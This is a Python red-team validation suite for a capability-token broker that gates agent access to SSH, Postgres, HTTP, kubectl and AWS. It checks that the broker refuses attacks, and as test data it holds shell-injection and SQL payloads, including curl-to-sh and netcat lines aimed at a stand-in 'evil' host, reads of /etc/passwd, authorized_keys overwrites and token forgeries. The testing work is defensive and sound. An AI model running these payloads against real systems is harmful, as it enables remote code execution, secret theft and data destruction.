#!/usr/bin/env python3
"""Adversarial validation. Run: python validate/redteam.py

Every case below is an ATTACK. Each one must be refused. The suite exits
non-zero if any attack succeeds, so it belongs in CI and in your pre-release
checklist.

This is deliberately separate from tests/. Unit tests check that the code does
what you meant. This checks that the system refuses what someone else meant.
Payloads are drawn from real published bypasses wherever one exists, because
attacks invented by the author of a defence tend to be the ones the defence
already handles.
"""

from __future__ import annotations

import json
import sys
from dataclasses import dataclass, field
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

import taper.chain as chain_mod                                                  # noqa: E402
from taper.adapters import (HTTPAdapter, PostgresAdapter, PostgresDescribeAdapter,  # noqa: E402
                            SSHAdapter)
from taper.broker import Broker                                                  # noqa: E402
from taper.caps import Never, OneOf, Prefix, Range, Subset                       # noqa: E402
from taper.chain import ChainError, Token, _b64, _unb64, verify                              # noqa: E402
from taper.pop import prove                                                      # noqa: E402

NOW = 1_756_000_000.0
GREEN, RED, YELLOW, DIM, BOLD, OFF = (
    "\033[32m", "\033[31m", "\033[33m", "\033[2m", "\033[1m", "\033[0m")


@dataclass
class Report:
    passed: int = 0
    failed: list[str] = field(default_factory=list)

    def check(self, name: str, refused: bool, detail: str = "") -> None:
        if refused:
            self.passed += 1
            print(f"  {GREEN}✓ refused{OFF}  {name}")
            if detail:
                print(f"            {DIM}{detail}{OFF}")
        else:
            self.failed.append(name)
            print(f"  {RED}✗ ALLOWED{OFF} {name}   {RED}<-- ATTACK SUCCEEDED{OFF}")
            if detail:
                print(f"            {detail}")


def section(title: str) -> None:
    print(f"\n{BOLD}{title}{OFF}\n" + "─" * 72)


root = Ed25519PrivateKey.generate()

FULL = {
    "ssh.exec": {
        "host": OneOf(["build-1.internal"]),
        "program": OneOf(["git", "make"]),
        "args": Subset(["status", "log", "build", "--oneline"]),
    },
    "pg.query": {
        "database": OneOf(["analytics"]),
        "statement_kind": OneOf(["select"]),
        "tables": Subset(["public.events"]),
        "max_rows": Range(0, 100),
    },
    "http.request": {
        "method": OneOf(["GET"]),
        "host": OneOf(["api.example.com"]),
        "path": Prefix("/v1/"),
    },
    "pg.describe": {
        "database": OneOf(["analytics"]),
        "table": OneOf(["public.events"]),
    },
}


def new_broker(tmp: Path) -> Broker:
    return Broker(
        root_pub=root.public_key(),
        adapters={"ssh.exec": SSHAdapter(), "pg.query": PostgresAdapter(),
                  "pg.describe": PostgresDescribeAdapter(),
                  "http.request": HTTPAdapter()},
        audit_path=tmp / "redteam-audit.jsonl",
        clock=lambda: NOW,
    )


def run(report: Report, tmp: Path) -> None:
    broker = new_broker(tmp)
    token = Token.issue(root, FULL, ttl_seconds=3600, now=NOW)
    wire = token.serialize()

    def denied(op: str, request: dict) -> tuple[bool, str]:
        d = broker.decide(wire, op, request)
        return (not d.allowed), d.reason

    # ---------------------------------------------------------------------
    section("1. Shell injection — must be impossible to express, not filtered")
    # If any of these reach policy evaluation at all, the typed-schema layer has
    # a hole. They should die in field validation.
    for payload in [
        "status; rm -rf /",
        "status && curl http://evil/x | sh",
        "status`whoami`",
        "$(cat /etc/passwd)",
        "status\nrm -rf /",
        "status | nc evil 1234",
        "status > /etc/cron.d/x",
        "--upload-pack=sh",                    # git-shell style option injection
        "-e/bin/sh",                           # rsync --rsh style
        "--output=/root/.ssh/authorized_keys",
    ]:
        ok, reason = denied("ssh.exec",
                            {"host": "build-1.internal", "program": "git",
                             "args": [payload]})
        report.check(f"arg {payload!r}", ok, reason if not ok else "")

    # ---------------------------------------------------------------------
    section("2. Option smuggling in the program slot")
    for program in ["bash", "sh", "/bin/sh", "git;bash", "../../bin/bash", "ssh"]:
        ok, reason = denied("ssh.exec",
                            {"host": "build-1.internal", "program": program,
                             "args": []})
        report.check(f"program {program!r}", ok, reason if not ok else "")

    # ---------------------------------------------------------------------
    section("3. Host escape")
    for host in ["prod-db.internal", "build-1.internal:2222",
                 "build-1.internal evil.internal", "evil.internal#build-1.internal",
                 "-oProxyCommand=sh"]:
        ok, reason = denied("ssh.exec",
                            {"host": host, "program": "git", "args": ["status"]})
        report.check(f"host {host!r}", ok, reason if not ok else "")

    # ---------------------------------------------------------------------
    section("4. Extra fields — the smuggling channel unknown-field handling opens")
    for extra in [{"shell": "/bin/sh"}, {"env": "LD_PRELOAD=/tmp/x"},
                  {"ProxyCommand": "sh"}, {"args_": ["build"]}]:
        request = {"host": "build-1.internal", "program": "git",
                   "args": ["status"], **extra}
        ok, reason = denied("ssh.exec", request)
        report.check(f"extra field {list(extra)[0]!r}", ok, reason if not ok else "")

    # ---------------------------------------------------------------------
    section("5. SQL — including the real pgAdmin CVE-2026-17351 payload")
    # The point of this section is NOT that the classifier catches everything.
    # It is that statement_kind is checked at all, and that the grant is
    # SELECT-only, so anything the classifier reads as non-select dies here and
    # anything it misreads still meets a read-only role at the database.
    for label, statement in [
        ("DDL", "DROP TABLE public.events"),
        ("write under select-only grant", "DELETE FROM public.events"),
        ("COPY ... FROM PROGRAM", "COPY x FROM PROGRAM 'curl http://evil|sh'"),
        ("DO block", "DO $$ BEGIN PERFORM 1; END $$"),
        ("stacked statements", "SELECT 1; DROP TABLE public.events"),
        ("pgAdmin backslash-quote bypass",
         r"SELECT 'a\'; COMMIT; DROP TABLE public.events; --"),
        ("table outside grant", "SELECT * FROM public.users"),
        ("pg_read_file", "SELECT pg_read_file('/etc/passwd')"),
        ("dblink to another server",
         "SELECT * FROM dblink('host=evil','SELECT 1') AS t(x int)"),
    ]:
        ok, reason = denied("pg.query",
                            {"database": "analytics", "statement": statement,
                             "max_rows": 10})
        report.check(f"sql: {label}", ok, reason if not ok else "")

    print(f"\n  {YELLOW}note{OFF} the classifier is a fast-fail, not the boundary. "
          f"validate/check_postgres.py\n       proves the DATABASE refuses these "
          f"independently. Run both.")

    # ---------------------------------------------------------------------
    section("5b. pg.describe — shape only, and only of what was named")
    for label, request in [
        ("table outside grant", {"database": "analytics", "table": "public.users"}),
        ("catalogue itself", {"database": "analytics", "table": "pg_catalog.pg_shadow"}),
        ("unqualified name", {"database": "analytics", "table": "events"}),
        ("injection in the name", {"database": "analytics",
                                   "table": "public.events; DROP TABLE public.events"}),
        ("trailing newline", {"database": "analytics", "table": "public.events\n"}),
        ("three-part name", {"database": "analytics", "table": "a.public.events"}),
        ("extra field", {"database": "analytics", "table": "public.events",
                         "statement": "SELECT * FROM public.events"}),
        ("wrong database", {"database": "production", "table": "public.events"}),
    ]:
        ok, reason = denied("pg.describe", request)
        report.check(f"describe: {label}", ok, reason if not ok else "")
    # The permitted describe must not be able to carry rows: the plan is a
    # fixed catalogue statement with the name bound, in a read-only transaction.
    permitted = {"database": "analytics", "table": "public.events"}
    d = broker.decide(wire, "pg.describe", permitted,
                      proof=prove(token.proving_key(), wire, "pg.describe", permitted, now=NOW))
    ok = (d.allowed and d.plan.detail["statement_params"] == ["public", "events"]
          and "events" not in d.plan.detail["statement_text"]
          and d.plan.detail["session_settings"]["default_transaction_read_only"] == "on")
    report.check("describe: a permitted request cannot carry rows or a write", ok,
                 "" if ok else d.reason)

    # ---------------------------------------------------------------------
    section("6. HTTP — path traversal and credential redirection")
    for label, request in [
        ("traversal", {"method": "GET", "host": "api.example.com",
                       "path": "/v1/../../admin"}),
        ("wrong host", {"method": "GET", "host": "evil.example.com", "path": "/v1/x"}),
        ("method escalation", {"method": "DELETE", "host": "api.example.com",
                               "path": "/v1/x"}),
        ("path outside prefix", {"method": "GET", "host": "api.example.com",
                                 "path": "/admin/keys"}),
        ("header injection", {"method": "GET", "host": "api.example.com",
                              "path": "/v1/x\nX-Evil: 1"}),
    ]:
        ok, reason = denied("http.request", request)
        report.check(f"http: {label}", ok, reason if not ok else "")

    # A traversal that policy ALLOWS because the prefix still matches is a real
    # residual risk. Say so out loud rather than pretending otherwise.
    d = broker.decide(wire, "http.request",
                      {"method": "GET", "host": "api.example.com",
                       "path": "/v1/../../admin"})
    if d.allowed:
        print(f"  {YELLOW}!{OFF} traversal within prefix reached policy — normalize "
              f"paths before matching")

    # ---------------------------------------------------------------------
    section("7. Token attacks")

    ok = True
    try:
        token.attenuate({"ssh.exec": {"host": OneOf(["build-1.internal", "prod-db"]),
                                      "program": OneOf(["git"]),
                                      "args": Subset(["status"])}}, now=NOW)
        ok = False
    except ChainError:
        pass
    report.check("widen host during attenuation", ok)

    ok = True
    try:
        token.attenuate({"ssh.exec": {"host": OneOf(["build-1.internal"]),
                                      "program": OneOf(["git", "bash"]),
                                      "args": Subset(["status"])}}, now=NOW)
        ok = False
    except ChainError:
        pass
    report.check("add a program during attenuation", ok)

    # Forge a correctly-signed widening block using the ephemeral key the holder
    # legitimately holds. This is the strongest attack in the suite.
    child = token.attenuate(
        {"ssh.exec": {"host": OneOf(["build-1.internal"]),
                      "program": OneOf(["git"]), "args": Subset(["status"])}},
        now=NOW)
    forged_block = chain_mod.Block(
        index=2,
        caps={"ssh.exec": {"host": OneOf(["prod-db.internal"]),
                           "program": OneOf(["bash"]), "args": Subset(["-c"])}},
        next_pub=chain_mod._pub_bytes(Ed25519PrivateKey.generate().public_key()),
        not_after=child.blocks[-1].not_after,
        prev_hash=child.blocks[-1].hash(),
    )
    forged_block.signature = child._next_priv.sign(forged_block.payload())
    forged = chain_mod.Token(blocks=child.blocks + [forged_block])

    refused = False
    try:
        verify(forged, root.public_key(), now=NOW)
    except ChainError:
        refused = True
    report.check("forged widening block (strict verify)", refused)

    caps = verify(forged, root.public_key(), now=NOW, strict=False)
    report.check("forged widening block (intersection, strict OFF)",
                 isinstance(caps["ssh.exec"]["host"], Never),
                 "even with the guardrail disabled, effective host = Never")

    # Splice a block from another chain.
    other = Token.issue(root, FULL, ttl_seconds=3600, now=NOW)
    spliced = chain_mod.Token(blocks=[other.blocks[0], child.blocks[1]])
    refused = False
    try:
        verify(spliced, root.public_key(), now=NOW)
    except ChainError:
        refused = True
    report.check("splice a block from another chain", refused)

    # Edit capabilities in place.
    tampered = Token.deserialize(token.serialize())
    tampered.blocks[0].caps["ssh.exec"]["program"] = OneOf(["git", "bash"])
    refused = False
    try:
        verify(tampered, root.public_key(), now=NOW)
    except ChainError:
        refused = True
    report.check("edit capabilities in an existing block", refused)

    # Extend TTL beyond the parent.
    long_child = token.attenuate(
        {"ssh.exec": {"host": OneOf(["build-1.internal"]),
                      "program": OneOf(["git"]), "args": Subset(["status"])}},
        ttl_seconds=86_400 * 30, now=NOW)
    report.check("extend TTL beyond parent",
                 long_child.expires_at() <= token.expires_at(),
                 f"child expires at parent's {int(token.expires_at() - NOW)}s")

    # Replay after expiry and after revocation.
    expired = Token.issue(root, FULL, ttl_seconds=10, now=NOW)
    refused = False
    try:
        verify(expired, root.public_key(), now=NOW + 11)
    except ChainError:
        refused = True
    report.check("replay an expired token", refused)

    revoked_broker = new_broker(tmp)
    revoked_broker.revoke(token.revocation_ids()[0])
    d = revoked_broker.decide(child.serialize(), "ssh.exec",
                              {"host": "build-1.internal", "program": "git",
                               "args": ["status"]})
    report.check("use a child of a revoked parent", not d.allowed, d.reason)

    # Attenuate a token you merely received over the wire.
    received = Token.deserialize(child.serialize())
    refused = False
    try:
        received.attenuate({"ssh.exec": {"host": OneOf(["build-1.internal"]),
                                         "program": OneOf(["git"]),
                                         "args": Subset([])}}, now=NOW)
    except ChainError:
        refused = True
    report.check("mint a sibling from a received token", refused,
                 "ephemeral signing key is never serialized")

    # Sign with the wrong root.
    impostor = Ed25519PrivateKey.generate()
    fake = Token.issue(impostor, FULL, ttl_seconds=3600, now=NOW)
    d = broker.decide(fake.serialize(), "ssh.exec",
                      {"host": "build-1.internal", "program": "git",
                       "args": ["status"]})
    report.check("token signed by a different root", not d.allowed, d.reason)

    # Malformed input should deny, never crash.
    for junk in ["", "!!!", "e30", "eyJiIjpbXX0", "A" * 10_000, "null"]:
        d = broker.decide(junk, "ssh.exec",
                          {"host": "build-1.internal", "program": "git"})
        report.check(f"malformed token {junk[:12]!r}", not d.allowed)

    # ---------------------------------------------------------------------
    section("7b. The subject — who the token acts for cannot be changed downstream")
    import json as _json
    from taper.chain import _b64 as _enc, _unb64 as _dec
    alice = Token.issue(root, FULL, ttl_seconds=3600, now=NOW, subject="alice@example.com")
    a_child = alice.attenuate(FULL, note="subagent", now=NOW)

    def forged(tok, mutate):
        data = _json.loads(_dec(tok.serialize()))
        mutate(data)
        return _enc(_json.dumps(data).encode())

    def _set_child(d): d["b"][1]["sub"] = "mallory@example.com"
    def _set_root(d): d["b"][0]["sub"] = "ceo@example.com"
    def _drop_root(d): d["b"][0].pop("sub")
    def _echo_child(d): d["b"][1]["sub"] = "alice@example.com"
    for label, wire_ in [
        ("child block claims another subject", forged(a_child, _set_child)),
        ("root subject rewritten", forged(a_child, _set_root)),
        ("root subject stripped", forged(a_child, _drop_root)),
        ("child repeats the root subject", forged(a_child, _echo_child)),
    ]:
        d = broker.decide(wire_, "ssh.exec", {"host": "build-1.internal", "program": "git"})
        report.check(f"subject: {label}", not d.allowed and d.subject == "",
                     d.reason if not d.allowed else "ALLOWED")
    bob = Token.issue(root, FULL, ttl_seconds=3600, now=NOW, subject="bob@example.com")
    spliced = Token(blocks=[bob.blocks[0], a_child.blocks[1]])
    d = broker.decide(spliced.serialize(), "ssh.exec",
                      {"host": "build-1.internal", "program": "git"})
    report.check("subject: alice's child spliced under bob's root",
                 not d.allowed and d.subject == "", d.reason)

    # ---------------------------------------------------------------------
    section("9. The tower — nothing but a verified decision mints a credential")
    from taper.audit import AuditLog as _Audit
    from tower.ca import CA as _CA
    from tower.clearance import ClearanceRefused as _Refused, Tower as _Tower
    from taper.broker import Decision as _Decision
    tower_ = _Tower(ca=_CA.create(), root_pub=root.public_key(),
                    audit=_Audit(tmp / "tower-audit.jsonl"), clock=lambda: NOW)
    good = Token.issue(root, FULL, ttl_seconds=3600, now=NOW, subject="alice@example.com")
    gw = good.serialize()
    sel = {"database": "analytics", "statement": "SELECT * FROM public.events", "max_rows": 1}

    def refused_by_tower(label, wire_, proof_, decision_):
        try:
            tower_.clear(wire_, "pg.query", sel, proof_, decision_, "taper_agent")
            report.check(f"tower: {label}", False, "A CERTIFICATE WAS ISSUED")
        except _Refused as exc:
            report.check(f"tower: {label}", True, str(exc))

    other_root = Ed25519PrivateKey.generate()
    forged_tok = Token.issue(other_root, FULL, ttl_seconds=3600, now=NOW, subject="alice@example.com")
    fwire = forged_tok.serialize()
    refused_by_tower("a decision that claims allow for a chain from another root",
                     fwire, prove(forged_tok.proving_key(), fwire, "pg.query", sel, now=NOW),
                     _Decision(True, "ok", "pg.query", {}, token_ids=forged_tok.revocation_ids(),
                               subject="alice@example.com"))
    refused_by_tower("a good chain with no proof", gw, None,
                     _Decision(True, "ok", "pg.query", {}, token_ids=good.revocation_ids(),
                               subject="alice@example.com"))
    refused_by_tower("a good chain, a proof for a different request", gw,
                     prove(good.proving_key(), gw, "pg.query", {**sel, "max_rows": 2}, now=NOW),
                     _Decision(True, "ok", "pg.query", {}, token_ids=good.revocation_ids(),
                               subject="alice@example.com"))
    refused_by_tower("a denial dressed as an allow by a broker that lies about the chain", gw,
                     prove(good.proving_key(), gw, "pg.query", sel, now=NOW),
                     _Decision(True, "ok", "pg.query", {}, token_ids=["not-this-chain"],
                               subject="alice@example.com"))
    refused_by_tower("a decision that names a different subject", gw,
                     prove(good.proving_key(), gw, "pg.query", sel, now=NOW),
                     _Decision(True, "ok", "pg.query", {}, token_ids=good.revocation_ids(),
                               subject="ceo@example.com"))
    expired = Token.issue(root, FULL, ttl_seconds=1, now=NOW - 100, subject="alice@example.com")
    ew = expired.serialize()
    refused_by_tower("an expired chain", ew,
                     prove(expired.proving_key(), ew, "pg.query", sel, now=NOW),
                     _Decision(True, "ok", "pg.query", {}, token_ids=expired.revocation_ids(),
                               subject="alice@example.com"))
    # and the honest request works exactly once, then its material is gone
    ok_proof = prove(good.proving_key(), gw, "pg.query", sel, now=NOW)
    c = tower_.clear(gw, "pg.query", sel, ok_proof,
                     _Decision(True, "ok", "pg.query", {}, token_ids=good.revocation_ids(),
                               subject="alice@example.com"), "taper_agent")
    tower_.take(c.id)
    try:
        tower_.take(c.id)
        report.check("tower: a clearance's material taken twice", False, "HANDED OUT AGAIN")
    except _Refused as exc:
        report.check("tower: a clearance's material taken twice", True, str(exc))
    intact, _ = tower_.audit.verify()
    report.check("tower: every refusal and the one clearance are on an intact tape", intact)

    # ---------------------------------------------------------------------
    section("10. Declared operations — a file is not a richer grammar in disguise")
    from taper import ops as _ops
    from taper.declared import DeclaredAdapter as _DA, SpecError as _SpecError, compile_spec as _compile

    def base_spec(**over):
        spec = {
            "operation": "kubectl.get", "summary": "read-only", "kind": "process",
            "fields": {
                "namespace": {"type": "string", "pattern": "[a-z0-9]([-a-z0-9]{0,61}[a-z0-9])?"},
                "resource": {"type": "string", "enum": ["pods", "deployments"]},
                "name": {"type": "string", "required": False,
                         "pattern": "[a-z0-9]([-a-z0-9]{0,61}[a-z0-9])?"},
            },
            "argv": ["kubectl", "get", "{resource}", "{name}", "--namespace", "{namespace}",
                     "--output", "json"],
            "secrets": {"env": {"KUBECONFIG": {"file": "kube.config"}}},
            "layer2": {"enforced_by": "RBAC", "check": "auth can-i"},
        }
        spec.update(over)
        return {k: v for k, v in spec.items() if v is not None}   # None drops a key

    def refused_at_load(label, **over):
        try:
            _compile(base_spec(**over))
            report.check(f"declared: {label}", False, "THE DECLARATION LOADED")
        except _SpecError as exc:
            report.check(f"declared: {label}", True, str(exc)[:110])

    # the loader: a spec that smuggles a command is refused before any grant
    refused_at_load("a free field after -c",
                    argv=["kubectl", "exec", "web", "--", "sh", "-c", "{name}"])
    refused_at_load("a free field after --command",
                    argv=["kubectl", "exec", "web", "--command", "{name}"])
    refused_at_load("bash as the program", argv=["bash", "{name}"])
    refused_at_load("sudo as the program", argv=["sudo", "kubectl", "get", "{resource}"])
    refused_at_load("the program from a field", argv=["{resource}", "get", "pods"])
    refused_at_load("a field inside a literal", argv=["kubectl", "get", "--namespace={namespace}"])
    refused_at_load("two fields in one element", argv=["kubectl", "get", "{resource}{name}"])
    refused_at_load("an optional field right after a flag",
                    argv=["kubectl", "get", "{resource}", "-n", "{name}", "--output", "json"])
    refused_at_load("a literal with a shell fragment in it",
                    argv=["kubectl", "get", "{resource}", "&&", "id"])
    refused_at_load("shadowing a built-in", operation="ssh.exec")
    refused_at_load("a statement with a field written into it", kind="sql",
                    database="shop", statement="SELECT * FROM {name}", params=[],
                    tables=["public.t"], argv=None, secrets=None)
    refused_at_load("two statements", kind="sql", database="shop",
                    statement="SELECT 1; DROP TABLE public.t", params=[],
                    tables=["public.t"], argv=None, secrets=None)
    refused_at_load("a path segment with a slash", kind="http", method="GET",
                    host="api.internal", path=["v1/../admin", "{name}"], argv=None, secrets=None)
    refused_at_load("a method from a field", kind="http", method="{resource}",
                    host="api.internal", path=["v1"], argv=None, secrets=None)
    refused_at_load("no layer2 key at all", layer2=None)   # dropped, not null

    # the broker: a good declaration, then every value that must be inexpressible
    decl = _compile(base_spec())
    _ops.REGISTRY[decl.name] = decl.operation()
    _ops.POLICY_ATTRIBUTES[decl.name] = decl.policy_attributes()
    dbroker = Broker(root_pub=root.public_key(), adapters={decl.name: _DA(decl)},
                     audit_path=tmp / "declared-audit.jsonl", clock=lambda: NOW)
    dcaps = {"kubectl.get": {"namespace": OneOf(["dev"]), "resource": OneOf(["pods"]),
                             "name": Prefix("web-")}}
    dtok = Token.issue(root, dcaps, ttl_seconds=3600, now=NOW, subject="alice@example.com",
                       definitions={"kubectl.get": decl.definition_hash()})
    dw = dtok.serialize()

    def declared_denied(label, request, wire_=dw, tok=dtok):
        d = dbroker.decide(wire_, "kubectl.get", request,
                           proof=prove(tok.proving_key(), wire_, "kubectl.get", request, now=NOW))
        report.check(f"declared: {label}", not d.allowed,
                     d.reason if not d.allowed else f"ALLOWED argv={d.plan.argv}")

    ok = dbroker.decide(dw, "kubectl.get", {"namespace": "dev", "resource": "pods", "name": "web-1"},
                        proof=prove(dtok.proving_key(), dw, "kubectl.get",
                                    {"namespace": "dev", "resource": "pods", "name": "web-1"}, now=NOW))
    report.check("declared: the honest request is allowed and argv is exactly the template",
                 ok.allowed and ok.plan.argv == ["kubectl", "get", "pods", "web-1",
                                                 "--namespace", "dev", "--output", "json"],
                 str(ok.plan.argv) if ok.allowed else ok.reason)
    for bad in ("web-1;id", "web-1 --all-namespaces", "web-1$(id)", "web-1`id`", "web-1|cat",
                "web-1\n--output=yaml", "web-1'", "{namespace}", "../web-1", "--all-namespaces"):
        declared_denied(f"name={bad!r}", {"namespace": "dev", "resource": "pods", "name": bad})
    declared_denied("a resource outside the enum", {"namespace": "dev", "resource": "secrets"})
    declared_denied("a namespace outside the grant", {"namespace": "kube-system", "resource": "pods"})
    declared_denied("an unknown field", {"namespace": "dev", "resource": "pods", "flags": "-A"})
    declared_denied("a wrong type", {"namespace": "dev", "resource": "pods", "name": 1})

    # the definition: edit the file, keep the grant
    edited = _compile(base_spec(argv=["kubectl", "delete", "{resource}", "{name}",
                                      "--namespace", "{namespace}"]))
    dbroker.adapters = {decl.name: _DA(edited)}
    declared_denied("the file was edited after the grant (get became delete)",
                    {"namespace": "dev", "resource": "pods", "name": "web-1"})
    dbroker.adapters = {decl.name: _DA(decl)}
    plain = Token.issue(root, dcaps, ttl_seconds=3600, now=NOW, subject="alice@example.com")
    declared_denied("a grant that never committed to a definition",
                    {"namespace": "dev", "resource": "pods", "name": "web-1"},
                    wire_=plain.serialize(), tok=plain)
    child = dtok.attenuate(dcaps, now=NOW)
    data = json.loads(_unb64(child.serialize()))
    data["b"][1]["defs"] = {"kubectl.get": edited.definition_hash()}
    declared_denied("a child block that carries its own definitions",
                    {"namespace": "dev", "resource": "pods", "name": "web-1"},
                    wire_=_b64(json.dumps(data).encode()), tok=child)
    intact, _ = dbroker.audit.verify()
    report.check("declared: every refusal is on an intact tape", intact)

    # ---------------------------------------------------------------------
    section("11. Tower for SSH and AWS — a credential for one operation carries no other")
    from tower.sshcert import SSHCA as _SSHCA, expect_hash as _expect, verify as _sshverify
    from tower.broker import ClearedBroker as _CB
    from tower.executor import ClearedExecutor as _CE
    import base64 as _b64mod
    ssh_ca = _SSHCA.create()
    stower = _Tower(ca=_CA.create(), root_pub=root.public_key(),
                    audit=_Audit(tmp / "ssh-tower-audit.jsonl"), clock=lambda: NOW,
                    ssh_ca=ssh_ca, shim="/usr/local/libexec/taper-shim")
    sbroker = _CB(root_pub=root.public_key(),
                  adapters={"ssh.exec": SSHAdapter(), "pg.query": PostgresAdapter()},
                  audit_path=tmp / "ssh-tower-audit.jsonl", clock=lambda: NOW, tower=stower)
    stok = Token.issue(root, FULL, ttl_seconds=3600, now=NOW, subject="alice@example.com")
    sw = stok.serialize()
    sreq = {"host": "build-1.internal", "program": "git", "args": ["status"]}
    sd = sbroker.decide(sw, "ssh.exec", sreq,
                        proof=prove(stok.proving_key(), sw, "ssh.exec", sreq, now=NOW))
    report.check("ssh: the honest request is cleared", sd.allowed and
                 sd.plan.detail["clearance"]["kind"] == "ssh",
                 sd.reason if not sd.allowed else "clearance " + sd.plan.detail["clearance"]["id"])
    smat = stower.take(sd.plan.detail["clearance"]["id"])
    scert = _sshverify(smat.cert_line, ssh_ca.key.public_key())
    fc = scert.critical_options.get("force-command", "")
    report.check("ssh: the certificate pins the shim to this request's hash",
                 fc == "/usr/local/libexec/taper-shim --expect " + _expect("git", ["status"]), fc)
    report.check("ssh: a different argument list has a different hash",
                 _expect("git", ["status", "--porcelain"]) != _expect("git", ["status"]))
    report.check("ssh: the certificate carries no extensions (no pty, no forwarding, no agent)",
                 scert.extensions == {}, str(scert.extensions))
    report.check("ssh: the certificate names this host as a principal",
                 scert.principals == ["taper-agent@build-1.internal", "taper-agent"],
                 str(scert.principals))
    report.check("ssh: the certificate lives sixty seconds",
                 scert.valid_before - int(NOW) == 60, f"{scert.valid_before - int(NOW)} s")
    try:
        stower.take(sd.plan.detail["clearance"]["id"])
        report.check("ssh: material taken twice", False, "HANDED OUT AGAIN")
    except _Refused as exc:
        report.check("ssh: material taken twice", True, str(exc))
    # a certificate edited to point at another command does not verify
    parts = smat.cert_line.split()
    blob = bytearray(_b64mod.b64decode(parts[1]))
    at = blob.index(b"--expect ")
    blob[at + 9] ^= 0x01
    try:
        _sshverify(parts[0] + b" " + _b64mod.b64encode(bytes(blob)), ssh_ca.key.public_key())
        report.check("ssh: a certificate with its force-command edited", False, "VERIFIED")
    except ValueError as exc:
        report.check("ssh: a certificate with its force-command edited", True, str(exc))
    # a certificate from another CA
    other_ca = _SSHCA.create()
    om = other_ca.issue("taper-agent", "build-1.internal", "git", ["status"], "x",
                        "mallory@example.com", "/usr/local/libexec/taper-shim", now=NOW)
    try:
        _sshverify(om.cert_line, ssh_ca.key.public_key())
        report.check("ssh: a certificate signed by another CA", False, "VERIFIED")
    except ValueError as exc:
        report.check("ssh: a certificate signed by another CA", True, str(exc))
    # the shim itself, if runnable here: the cleared hash admits one request
    import subprocess as _sp, sys as _sys, json as _json
    allow = tmp / "allowlist.json"
    allow.write_text(_json.dumps({"programs": {"echo": {"path": "/bin/echo",
                                                        "args": ["hello", "world"]}}}))
    _root = Path(__file__).resolve().parent.parent
    env = {**__import__("os").environ, "TAPER_ALLOWLIST": str(allow),
           "PYTHONPATH": str(_root)}
    def shim(payload, expect):
        r = _sp.run([_sys.executable, str(_root / "taper" / "shim.py"), "--expect", expect],
                    input=_json.dumps(payload), capture_output=True, text=True, env=env, timeout=30)
        try:
            return _json.loads(r.stdout)
        except _json.JSONDecodeError:
            return {"ok": False, "error": r.stdout + r.stderr}
    h = _expect("echo", ["hello"])
    report.check("shim: the request the clearance named runs",
                 shim({"program": "echo", "args": ["hello"]}, h).get("ok") is True)
    for payload in ({"program": "echo", "args": ["world"]},
                    {"program": "echo", "args": ["hello", "world"]},
                    {"program": "echo", "args": []}):
        out = shim(payload, h)
        report.check(f"shim: {payload['args']} under a clearance for ['hello']",
                     not out.get("ok") and "not the one this clearance" in out.get("error", ""),
                     out.get("error", "RAN"))

    # AWS: the session policy is the request's values and nothing wider
    from taper import ops as _ops2
    from taper.declared import DeclaredAdapter as _DA2, compile_spec as _compile2, SpecError as _SE2
    from tower.sts import AWSSession as _Session, session_policy as _policy
    aws_spec = {
        "operation": "aws.s3ls", "summary": "list", "kind": "process",
        "fields": {"bucket": {"type": "string", "pattern": "[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]"},
                   "prefix": {"type": "string", "pattern": "[A-Za-z0-9_./-]{0,512}"}},
        "argv": ["aws", "s3api", "list-objects-v2", "--bucket", "{bucket}", "--prefix", "{prefix}"],
        "aws": {"role_arn": "arn:aws:iam::123456789012:role/reader", "actions": ["s3:ListBucket"],
                "resources": ["arn:aws:s3:::{bucket}"],
                "conditions": {"StringLike": {"s3:prefix": "{prefix}*"}}},
        "layer2": {"enforced_by": "IAM", "check": "put-object -> AccessDenied"},
    }
    adecl = _compile2(aws_spec)
    _ops2.REGISTRY[adecl.name] = adecl.operation()
    _ops2.POLICY_ATTRIBUTES[adecl.name] = adecl.policy_attributes()
    asked = []
    class _FakeSTS:
        def assume(self, role_arn, policy, cid, subject, now=None, seconds=900):
            asked.append(policy)
            return _Session("ASIA", "s", "t", 1, NOW + 900)
    atower = _Tower(ca=_CA.create(), root_pub=root.public_key(),
                    audit=_Audit(tmp / "aws-tower-audit.jsonl"), clock=lambda: NOW,
                    sts=_FakeSTS(), definitions={adecl.name: adecl.definition_hash()})
    abroker = _CB(root_pub=root.public_key(), adapters={adecl.name: _DA2(adecl)},
                  audit_path=tmp / "aws-tower-audit.jsonl", clock=lambda: NOW, tower=atower)
    acaps = {"aws.s3ls": {"bucket": OneOf(["reports"]), "prefix": Prefix("2026/")}}
    atok = Token.issue(root, acaps, ttl_seconds=3600, now=NOW, subject="alice@example.com",
                       definitions={adecl.name: adecl.definition_hash()})
    aw = atok.serialize()
    areq = {"bucket": "reports", "prefix": "2026/09/"}
    ad = abroker.decide(aw, "aws.s3ls", areq, proof=prove(atok.proving_key(), aw, "aws.s3ls", areq, now=NOW))
    report.check("aws: the honest request is cleared with a session",
                 ad.allowed and ad.plan.detail["clearance"]["kind"] == "aws",
                 ad.reason if not ad.allowed else "ok")
    report.check("aws: the session policy names this bucket and this prefix only",
                 asked and asked[-1]["Statement"][0]["Resource"] == ["arn:aws:s3:::reports"]
                 and asked[-1]["Statement"][0]["Condition"]["StringLike"]["s3:prefix"] == "2026/09/*",
                 str(asked[-1] if asked else None))
    for label, req in (("another bucket", {"bucket": "payroll", "prefix": "2026/"}),
                       ("a prefix outside the grant", {"bucket": "reports", "prefix": "2025/"}),
                       ("a bucket name with a wildcard", {"bucket": "*", "prefix": "2026/"}),
                       ("a prefix that escapes to a sibling", {"bucket": "reports", "prefix": "../"})):
        n = len(asked)
        d = abroker.decide(aw, "aws.s3ls", req, proof=prove(atok.proving_key(), aw, "aws.s3ls", req, now=NOW))
        report.check(f"aws: {label} never reaches STS", not d.allowed and len(asked) == n, d.reason)
    for label, block in (("an action wildcard", {"actions": ["s3:*"]}),
                         ("a resource wildcard", {"resources": ["*"]}),
                         ("a placeholder outside the resource part", {"resources": ["arn:aws:{bucket}:::x"]}),
                         ("a user ARN as the role", {"role_arn": "arn:aws:iam::123456789012:user/admin"})):
        try:
            _compile2({**aws_spec, "aws": {**aws_spec["aws"], **block}})
            report.check(f"aws declaration: {label}", False, "LOADED")
        except _SE2 as exc:
            report.check(f"aws declaration: {label}", True, str(exc)[:100])
    try:
        _policy({"actions": ["s3:ListBucket"], "resources": []})
